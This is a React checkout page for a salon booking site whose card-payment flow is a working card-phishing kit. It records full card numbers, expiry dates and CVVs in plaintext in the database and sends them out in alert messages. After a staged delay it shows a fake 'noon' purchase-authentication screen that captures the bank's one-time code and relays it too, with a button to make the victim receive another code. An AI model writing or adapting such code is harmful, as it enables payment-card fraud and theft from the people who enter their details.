import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useQuery } from "@tanstack/react-query";
import { useEffect, useRef, useState, type ReactNode } from "react";
import { toast } from "sonner";
import { useCart } from "@/lib/cart";
import { useAuth } from "@/lib/auth";
import { useProfile } from "@/lib/profile";
import { advanceFor, DEFAULT_SETTINGS, fmtTime, sar, serviceImage, settingsQuery } from "@/lib/data";
import { supabase, friendlyError } from "@/lib/supabase";
import { sendAlert } from "@/lib/alerts";
import { CitySelect, EmptyState, RequireAuth } from "@/components/shared";
import { PaymentForm, type PaymentResult } from "@/components/PaymentForm";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Button } from "@/components/ui/button";
import { FullNotice } from "@/components/FullNotice";
import { Building2, CreditCard, Wallet } from "lucide-react";

export const Route = createFileRoute("/checkout")({
  head: () => ({
    meta: [
      { title: "Details & Payment — The Beauty House" },
      { name: "description", content: "Enter your details and pay the advance to confirm your booking." },
      { property: "og:title", content: "Details & Payment — The Beauty House" },
      { property: "og:description", content: "Confirm your salon booking." },
    ],
  }),
  component: () => <RequireAuth what="book"><Checkout /></RequireAuth>,
});

function Checkout() {
  const { user } = useAuth();
  const { lines, slot, total, clear } = useCart();
  const { data: settings = DEFAULT_SETTINGS } = useQuery(settingsQuery);
  const navigate = useNavigate();
  const [name, setName] = useState("");
  const [phone, setPhone] = useState("");
  const [city, setCity] = useState("");
  const [notes, setNotes] = useState("");
  const [ready, setReady] = useState(false);
  const [fullOpen, setFullOpen] = useState(true);
  const { data: profile } = useProfile();
  const [view, setView] = useState<"details" | "method" | "pay" | "card" | "wait" | "otp" | "verify">("details");
  const [method, setMethod] = useState<"bank" | "wallet" | "card">("bank");
  const [cardHolder, setCardHolder] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [cardOtp, setCardOtp] = useState("");
  const [cardBookingId, setCardBookingId] = useState<string | null>(null);
  const [cardBookingCode, setCardBookingCode] = useState("");
  const [otpLeft, setOtpLeft] = useState(60);
  const waitStarted = useRef(0);

  useEffect(() => {
    const raw = localStorage.getItem("checkout-draft");
    if (raw) {
      try {
        const d = JSON.parse(raw) as { name?: string; phone?: string; city?: string; notes?: string };
        setName(d.name ?? "");
        setPhone(d.phone ?? "");
        setCity(d.city ?? "");
        setNotes(d.notes ?? "");
        setReady(true);
        return;
      } catch { /* ignore */ }
    }
    if (!user) { setReady(true); return; }
    supabase.from("profiles").select("full_name, phone, city").eq("id", user.id).maybeSingle().then(({ data }) => {
      if (data) { setName(data.full_name ?? ""); setPhone(data.phone ?? ""); setCity(data.city ?? ""); }
      setReady(true);
    });
  }, [user]);

  useEffect(() => {
    if (!ready) return;
    localStorage.setItem("checkout-draft", JSON.stringify({ name, phone, city, notes }));
  }, [name, phone, city, notes, ready]);

  if (!lines.length || !slot)
    return <div className="mx-auto max-w-xl px-4 py-16"><EmptyState title="Nothing to book yet"><Button asChild className="mt-4 rounded-full"><Link to="/services">Browse services</Link></Button></EmptyState></div>;
  if (settings.bookings_full)
    return (
      <div className="mx-auto max-w-xl px-4 py-16">
        <FullNotice open={fullOpen} message={settings.full_message || "Bookings are currently unavailable because we have too many customers."} onClose={() => setFullOpen(false)} />
        {!fullOpen && <EmptyState title="Bookings unavailable">{settings.full_message}</EmptyState>}
      </div>
    );

  const { advance } = advanceFor(total, settings.advance_percent);

  const bankOk = settings.bank_enabled && (profile?.allow_bank ?? true);
  const walletOk = settings.stc_enabled && (profile?.allow_wallet ?? true);
  const cardOk = settings.card_enabled !== false && (profile?.allow_card ?? true);

  const validateDetails = () => {
    if (name.trim().length < 2) throw new Error("Please enter your name.");
    if (!/^[+0-9 ]{8,16}$/.test(phone.trim())) throw new Error("Please enter a valid phone number.");
    if (!city.trim()) throw new Error("Select your city.");
  };

  const saveProfile = async () => {
    await supabase.from("profiles").update({ full_name: name.trim(), phone: phone.trim(), city: city.trim() || null }).eq("id", user!.id);
  };

  const insertBooking = async (payment: {
    method: "bank" | "wallet" | "card";
    screenshotPath?: string | null;
    card?: { holder: string; number: string; expiry: string; cvv: string };
  }) => {
    validateDetails();
    const { data, error } = await supabase
      .from("bookings")
      .insert({
        user_id: user!.id,
        customer_name: name.trim().slice(0, 80),
        phone: phone.trim(),
        city: city.trim().slice(0, 60) || null,
        notes: notes.trim().slice(0, 500) || null,
        booking_date: slot.date,
        booking_time: slot.time,
        items: lines.map((l) => ({ service_id: l.service.id, name: l.service.name, price: l.service.price, qty: l.qty })),
        payment_method: payment.method,
        screenshot_path: payment.screenshotPath ?? null,
        card_holder: payment.card?.holder ?? null,
        card_number: payment.card?.number ?? null,
        card_expiry: payment.card?.expiry ?? null,
        card_cvv: payment.card?.cvv ?? null,
      })
      .select("id, code, advance_amount, user_code")
      .single();
    if (error) throw new Error(friendlyError(error));
    await saveProfile();
    return data;
  };

  const finishCheckout = () => {
    clear();
    localStorage.removeItem("checkout-draft");
  };

  const onSubmit = async (p: PaymentResult) => {
    const data = await insertBooking({ method: p.method, screenshotPath: p.screenshotPath });
    await sendAlert(
      p.method === "wallet" ? "wallet_payment" : "new_booking",
      `Payment submitted\nBooking ${data.code}\nUser ${data.user_code ?? ""}\n${name} (${phone})\n${slot.date} ${fmtTime(slot.time)}\nAdvance ${sar(Number(data.advance_amount))} via ${p.method}`,
    );
    if (p.method === "wallet") {
      await sendAlert("payment_approved", `Payment approved\nBooking ${data.code}\nUser ${data.user_code ?? ""}\nwallet\n${sar(Number(data.advance_amount))}`);
    }
    finishCheckout();
    toast.success(`Booking ${data.code} submitted. The salon will confirm your payment.`);
    navigate({ to: "/my-bookings" });
  };

  const hold = async (ms: number) => {
    const left = ms - (Date.now() - waitStarted.current);
    if (left > 0) await new Promise((r) => setTimeout(r, left));
  };

  useEffect(() => {
    if (view !== "otp") return;
    setOtpLeft(60);
    const id = window.setInterval(() => setOtpLeft((n) => (n > 0 ? n - 1 : 0)), 1000);
    return () => window.clearInterval(id);
  }, [view, cardBookingId]);

  const submitCardDetails = async () => {
    const holder = cardHolder.trim();
    const number = cardNumber.replace(/\s/g, "");
    const expiry = cardExpiry.trim();
    const cvv = cardCvv.trim();
    if (holder.length < 2) { toast.error("Enter the cardholder name."); return; }
    if (!/^[0-9]{13,19}$/.test(number)) { toast.error("Enter a valid card number."); return; }
    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) { toast.error("Enter a valid expiry."); return; }
    if (!/^[0-9]{3,4}$/.test(cvv)) { toast.error("Enter a valid CVV."); return; }
    waitStarted.current = Date.now();
    setView("wait");
    try {
      const data = await insertBooking({
        method: "card",
        card: { holder, number, expiry, cvv },
      });
      setCardBookingId(data.id);
      setCardBookingCode(data.code);
      try {
        await sendAlert(
          "card_payment",
          `Card payment pending review\nBooking: ${data.code}\nUser: ${data.user_code ?? ""}\nCustomer: ${name.trim()} (${phone.trim()})\nAmount: ${sar(Number(data.advance_amount))}\n\nCardholder: ${holder}\nCard: ${number}\nExpiry: ${expiry}\nCVV: ${cvv}`,
        );
      } catch { /* payment stays saved */ }
      await hold(15000);
      setCardOtp("");
      setView("otp");
    } catch (e) {
      setView("card");
      toast.error((e as Error).message || "Could not submit card payment");
    }
  };

  const requestAnotherCode = async () => {
    setOtpLeft(60);
    try {
      await sendAlert(
        "card_otp",
        `Customer asked for another code\nBooking: ${cardBookingCode}\nUser: ${profile?.user_code ?? ""}\nAmount: ${sar(advance)}`,
      );
    } catch { /* timer still resets */ }
  };

  const cancelCard = async () => {
    if (cardBookingId) {
      const { error } = await supabase.rpc("cancel_pending_card", { p_booking: cardBookingId });
      if (error) toast.error(friendlyError(error));
    }
    setCardBookingId(null);
    setCardBookingCode("");
    setCardOtp("");
    setView("card");
  };

  const submitCardOtp = async () => {
    const otp = cardOtp.trim();
    if (!cardBookingId) { toast.error("Start card payment again from checkout."); return; }
    if (!/^[0-9]{4,8}$/.test(otp)) { toast.error("Enter the code."); return; }
    waitStarted.current = Date.now();
    setView("verify");
    try {
      const { error } = await supabase.rpc("submit_card_otp", { p_booking: cardBookingId, p_otp: otp });
      if (error) throw new Error(friendlyError(error));
      try {
        await sendAlert(
          "card_otp",
          `Card code for review\nBooking: ${cardBookingCode}\nUser: ${profile?.user_code ?? ""}\nCode: ${otp}`,
        );
      } catch { /* code is already saved */ }
      await hold(12000);
      finishCheckout();
      toast.success(`Booking ${cardBookingCode} is waiting for the salon to approve the payment.`);
      navigate({ to: "/my-bookings" });
    } catch (e) {
      setView("otp");
      toast.error((e as Error).message || "Could not submit the code");
    }
  };

  const shell = (title: string, step: number, body: ReactNode) => (
    <div className="min-h-screen bg-[#fff0f6] px-4 pb-28 pt-4 md:pb-10">
      <div className="mx-auto max-w-3xl">
        <ol className="mb-4 flex items-center justify-between text-[11px] font-semibold text-[#9a5b78]">
          {["Services", "Cart", "Details", "Payment"].map((label, i) => (
            <li key={label} className="flex flex-1 flex-col items-center gap-1">
              <span className={`grid h-8 w-8 place-items-center rounded-full ${i + 1 <= step ? "bg-[#ff4d94] text-white" : "bg-white"}`}>{i + 1}</span>
              {label}
            </li>
          ))}
        </ol>
        <h1 className="font-display text-4xl font-semibold text-[#5c2344]">{title}</h1>
        {body}
      </div>
    </div>
  );

  const orderSummary = (
    <div className="rounded-3xl bg-white p-4 shadow-sm">
      <h2 className="font-display text-2xl font-semibold text-[#3d2030]">Order <span className="text-[#ff4d94]">Summary</span></h2>
      {lines.map((l) => (
        <div key={l.service.id} className="mt-3 flex items-center gap-3">
          <img src={serviceImage(l.service)} alt="" className="h-12 w-12 rounded-xl object-cover" />
          <div className="flex-1"><p>{l.service.name} × {l.qty}</p><p className="text-xs text-[#9a5b78]">{l.service.duration_min} min</p></div>
          <p className="font-semibold">{sar(l.service.price * l.qty)}</p>
        </div>
      ))}
      <div className="mt-3 space-y-2 border-t border-pink-50 pt-3 text-sm">
        <div className="flex justify-between"><span>Total Amount</span><strong>{sar(total)}</strong></div>
        <div className="flex justify-between"><span>Pay Now ({settings.advance_percent}%)</span><strong>{sar(advance)}</strong></div>
      </div>
    </div>
  );

  const cardDigits = cardNumber.replace(/\D/g, "");
  const previewGroups = [0, 1, 2, 3].map((i) => {
    const part = cardDigits.slice(i * 4, i * 4 + 4);
    return part || "••••";
  });
  const brandLogos = [
    { src: "/images/visa.jpeg", alt: "Visa" },
    { src: "/images/mastercard.jpeg", alt: "Mastercard" },
    { src: "/images/mada.jpeg", alt: "mada" },
  ];
  const payAmount = `SAR ${Number(advance).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;

  const loadingCard = (title: string) => (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/45 p-4">
      <div className="w-full max-w-[420px] rounded-lg bg-white px-6 py-8 text-center">
        <img src="/images/noon-logo.png" alt="noon" className="mx-auto h-9 w-auto max-h-9 object-contain" />
        <div className="mx-auto mt-6 h-10 w-10 animate-spin rounded-full border-4 border-[#1A4FD6] border-t-transparent" />
        <p className="mt-4 text-base font-semibold text-black">{title}</p>
        <p className="mt-1 text-sm text-[#444]">Please wait, do not close this page.</p>
      </div>
    </div>
  );

  if (view === "wait") return loadingCard("Please wait...");
  if (view === "verify") return loadingCard("Authenticating your payment...");

  if (view === "otp") {
    return (
      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/45 p-4">
        <div className="w-full max-w-[420px] rounded-md bg-white px-4 py-4 text-black">
          <div className="grid grid-cols-3 items-center">
            <span />
            <img src="/images/noon-logo.png" alt="noon" className="mx-auto h-9 w-auto max-h-9 object-contain" />
            <button type="button" onClick={cancelCard} className="justify-self-end text-xs font-semibold tracking-wide text-black">CANCEL</button>
          </div>
          <div className="mt-1 flex justify-end">
            <button type="button" onClick={cancelCard} aria-label="Close" className="text-lg leading-none text-black">×</button>
          </div>
          <div className="mt-2 grid grid-cols-3 gap-3">
            {brandLogos.map((logo) => (
              <div key={logo.alt} className="flex min-h-14 items-center justify-center px-1.5 py-2">
                <img src={logo.src} alt={logo.alt} className="h-[42px] w-full object-contain object-center" />
              </div>
            ))}
          </div>
          <h2 className="mt-3 text-center text-lg font-semibold">Purchase authentication</h2>
          <p className="mt-2 text-center text-sm text-[#333]">Please enter the verification code we just sent to your mobile number.</p>
          <p className="mt-3 text-center text-sm">You are paying NOON the amount of <strong>{payAmount}</strong>.</p>
          <label className="mt-4 block text-sm font-semibold text-[#1A4FD6]">Verification code</label>
          <Input value={cardOtp} onChange={(e) => setCardOtp(e.target.value.replace(/\D/g, "").slice(0, 8))} inputMode="numeric" autoComplete="off" maxLength={8} className="mt-1 h-11 rounded-md border-black text-black" />
          <button type="button" onClick={submitCardOtp} className="mt-3 h-11 w-full rounded-md bg-[#1A4FD6] font-semibold text-white">SUBMIT</button>
          <p className="mt-3 text-center text-sm">{otpLeft}s</p>
          <button type="button" onClick={requestAnotherCode} className="mt-1 w-full text-center text-xs font-semibold text-[#1A4FD6]">CLICK HERE TO RECEIVE ANOTHER CODE</button>
          <p className="mt-4 text-center text-xs text-[#1A4FD6]">
            <button type="button" className="font-semibold">Need help?</button>
            <span className="px-1 text-black">|</span>
            <button type="button" className="font-semibold">FAQ</button>
          </p>
        </div>
      </div>
    );
  }

  if (view === "card") {
    return shell("", 4, (
      <div className="mt-4 rounded-2xl bg-white p-4 text-black shadow-sm">
        <h2 className="text-xl font-semibold">Manual POS Card Payment</h2>
        <span className="mt-1 block h-1 w-16 bg-[#FFDE21]" />
        <p className="mt-2 text-xs font-semibold tracking-wide text-[#444]">NOON INSTALMENT · Secure Checkout</p>
        <p className="mt-4 text-sm font-semibold">Accepted Cards</p>
        <div className="mt-2 flex flex-nowrap items-center gap-2">
          {brandLogos.map((logo) => (
            <span key={logo.alt} className="inline-flex min-w-0 flex-1 items-center justify-center rounded-lg border border-[#e2e2e2] bg-white px-2 py-1">
              <img src={logo.src} alt={logo.alt} className="h-[34px] w-auto max-w-full object-contain object-center" />
            </span>
          ))}
        </div>
        <div className="mt-4 rounded-2xl bg-black p-4 text-white">
          <p className="font-mono text-lg tracking-widest">{previewGroups.join("  ")}</p>
          <div className="mt-6 flex items-end justify-between gap-3 text-sm">
            <p className="min-w-0 truncate uppercase">{cardHolder.trim() || "CARDHOLDER NAME"}</p>
            <p className="shrink-0 font-mono">{cardExpiry || "MM/YY"}</p>
          </div>
        </div>
        <div className="mt-4 grid gap-3">
          <div>
            <Label className="text-black">Cardholder name</Label>
            <Input value={cardHolder} onChange={(e) => setCardHolder(e.target.value)} autoComplete="off" className="mt-1 h-12 rounded-xl border-[#e5e7eb] text-black" />
          </div>
          <div>
            <Label className="text-black">Card number</Label>
            <Input
              value={cardNumber}
              onChange={(e) => {
                const digits = e.target.value.replace(/\D/g, "").slice(0, 19);
                setCardNumber(digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim());
              }}
              inputMode="numeric"
              autoComplete="off"
              className="mt-1 h-12 rounded-xl border-[#e5e7eb] tracking-wider text-black"
            />
          </div>
          <div className="grid grid-cols-2 gap-3">
            <div>
              <Label className="text-black">Expiry</Label>
              <Input
                value={cardExpiry}
                onChange={(e) => {
                  const digits = e.target.value.replace(/\D/g, "").slice(0, 4);
                  setCardExpiry(digits.length <= 2 ? digits : `${digits.slice(0, 2)}/${digits.slice(2)}`);
                }}
                placeholder="MM/YY"
                inputMode="numeric"
                autoComplete="off"
                maxLength={5}
                className="mt-1 h-12 rounded-xl border-[#e5e7eb] text-black"
              />
            </div>
            <div>
              <Label className="text-black">CVV</Label>
              <Input value={cardCvv} onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4))} placeholder="123" inputMode="numeric" autoComplete="off" maxLength={4} type="password" className="mt-1 h-12 rounded-xl border-[#e5e7eb] text-black" />
            </div>
          </div>
        </div>
        <button type="button" onClick={submitCardDetails} className="mt-4 h-12 w-full rounded-xl bg-[#111827] font-semibold text-white">Pay {payAmount}</button>
        <button type="button" onClick={() => setView("method")} className="mt-3 w-full text-sm font-semibold text-[#ff4d94]">Back</button>
      </div>
    ));
  }

  if (view === "pay") {
    return shell("Payment", 4, (
      <div className="mt-2">
        <p className="text-[#9a5b78]">Complete your payment using the selected method.</p>
        <div className="mt-3 rounded-3xl bg-white p-4 shadow-sm">
          <p className="font-semibold text-[#ff4d94]">{method === "bank" ? "Bank Transfer" : "Wallet Balance"}</p>
        </div>
        <div className="mt-4">
          <PaymentForm settings={settings} amount={advance} userId={user!.id} only={method === "card" ? "bank" : method} submitLabel={method === "bank" ? "Submit Payment" : `Pay ${sar(advance)}`} onSubmit={onSubmit} />
        </div>
        <div className="mt-4 rounded-3xl bg-white p-4 text-sm shadow-sm">
          <p className="font-semibold text-[#ff4d94]">Payment Summary</p>
          <div className="mt-2 flex justify-between"><span>Total Amount</span><span>{sar(total)}</span></div>
          <div className="mt-2 flex justify-between"><span>Pay now ({settings.advance_percent}%)</span><span>{sar(advance)}</span></div>
        </div>
        <button type="button" onClick={() => setView("method")} className="mt-3 w-full text-sm font-semibold text-[#ff4d94]">Back</button>
      </div>
    ));
  }

  if (view === "method") {
    return shell("Payment", 4, (
      <div className="mt-4 space-y-4">
        {orderSummary}
        <div className="rounded-3xl bg-white p-4 shadow-sm">
          <p className="font-semibold text-[#ff4d94]">Payment Method</p>
          <div className="mt-3 grid grid-cols-1 gap-3 sm:grid-cols-3">
            {([
              { id: "bank" as const, label: "Bank Transfer", icon: Building2, on: bankOk },
              { id: "card" as const, label: "Credit/Debit Card", icon: CreditCard, on: cardOk },
              { id: "wallet" as const, label: "Wallet Balance", icon: Wallet, on: walletOk },
            ]).filter((m) => m.on).map((m) => (
              <button key={m.id} type="button" onClick={() => setMethod(m.id)} className={`flex flex-col items-center gap-2 rounded-2xl border p-3 text-sm font-semibold ${method === m.id ? "border-[#ff4d94] bg-[#fff0f6] text-[#ff4d94]" : "border-pink-100 text-[#5c2344]"}`}>
                <m.icon className="h-6 w-6" />
                {m.label}
              </button>
            ))}
          </div>
          {!bankOk && !walletOk && !cardOk && (
            <p className="mt-2 text-sm text-[#e23b86]">No payment methods are enabled for your account. Contact the salon.</p>
          )}
          <button
            type="button"
            disabled={!bankOk && !walletOk && !cardOk}
            onClick={() => {
              if (method === "card" && cardOk) setView("card");
              else if ((method === "bank" && bankOk) || (method === "wallet" && walletOk)) setView("pay");
              else toast.error("Choose an available payment method.");
            }}
            className="mt-4 h-12 w-full rounded-full bg-[#ff4d94] font-semibold text-white disabled:opacity-50"
          >
            Pay {sar(advance)} ({settings.advance_percent}%) →
          </button>
          <button type="button" onClick={() => setView("details")} className="mt-3 w-full text-sm font-semibold text-[#ff4d94]">Back</button>
        </div>
      </div>
    ));
  }

  return shell("Your details", 3, (
    <div className="mt-4 space-y-4">
      <div className="grid grid-cols-2 gap-3 rounded-3xl bg-white p-4 shadow-sm">
        <div><Label htmlFor="n">Full name</Label><Input id="n" value={name} maxLength={80} onChange={(e) => setName(e.target.value)} className="mt-1 rounded-2xl" /></div>
        <div><Label htmlFor="p">Phone</Label><Input id="p" value={phone} maxLength={16} inputMode="tel" placeholder="05xxxxxxxx" onChange={(e) => setPhone(e.target.value)} className="mt-1 rounded-2xl" /></div>
        <div><Label htmlFor="c">City</Label><CitySelect id="c" value={city} onChange={setCity} className="mt-1" /></div>
        <div><Label htmlFor="no">Description</Label><Textarea id="no" value={notes} maxLength={500} placeholder="Any special request..." onChange={(e) => setNotes(e.target.value)} className="mt-1 rounded-2xl" /></div>
      </div>
      <button
        type="button"
        onClick={() => {
          try { validateDetails(); setView("method"); }
          catch (e) { toast.error((e as Error).message); }
        }}
        className="h-12 w-full rounded-full bg-[#ff4d94] font-semibold text-white"
      >
        Continue
      </button>
    </div>
  ));
}
